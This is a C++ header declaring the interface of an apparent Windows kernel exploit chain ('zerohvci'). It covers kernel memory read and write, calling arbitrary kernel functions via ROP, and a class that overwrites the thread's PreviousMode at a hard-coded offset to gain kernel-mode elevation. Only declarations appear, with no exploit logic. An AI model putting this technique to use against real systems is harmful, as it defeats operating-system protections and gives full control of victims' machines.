#pragma once
#include <Windows.h>
#include <cstddef>

namespace zerohvci {

// Initialize exploit chain - returns true if kernel R/W obtained
bool Initialize();

// Core memory primitives (require Initialize() first)
// Note: These are named with Ex suffix to avoid collision with exploit.h functions
bool ReadKernelMemoryEx(void* src, void* dst, size_t size);
bool WriteKernelMemoryEx(void* dst, void* src, size_t size);

// KernelForge wrapper - allocate NonPagedPoolNx memory
void* AllocateKernelPool(size_t size);

// Call arbitrary kernel function via ROP
template<typename Ret, typename... Args>
Ret CallKernelFunction(const char* funcName, Args... args);

// Cleanup - restore PreviousMode
void Cleanup();

// Status queries
bool IsInitialized();
ULONG64 GetSystemCr3();
ULONG64 GetCachedKThread();    // Returns cached KTHREAD from Initialize()
ULONG64 GetCachedEProcess();   // Returns cached EPROCESS from Initialize()

//=============================================================================
// ScopedKernelMode - RAII wrapper for kernel mode elevation
// Automatically restores PreviousMode on scope exit
// CRITICAL for Windows 11 24H2+ which validates thread state on return
//=============================================================================
class ScopedKernelMode {
public:
    ScopedKernelMode();
    ~ScopedKernelMode();

    bool IsElevated() const { return m_elevated; }

    // Non-copyable, non-movable
    ScopedKernelMode(const ScopedKernelMode&) = delete;
    ScopedKernelMode& operator=(const ScopedKernelMode&) = delete;
    ScopedKernelMode(ScopedKernelMode&&) = delete;
    ScopedKernelMode& operator=(ScopedKernelMode&&) = delete;

private:
    bool m_elevated = false;
    ULONG64 m_kthread = 0;
    BYTE m_originalMode = 1;  // Default UserMode

    static constexpr ULONG PREVIOUSMODE_OFFSET = 0x232;
};

} // namespace zerohvci
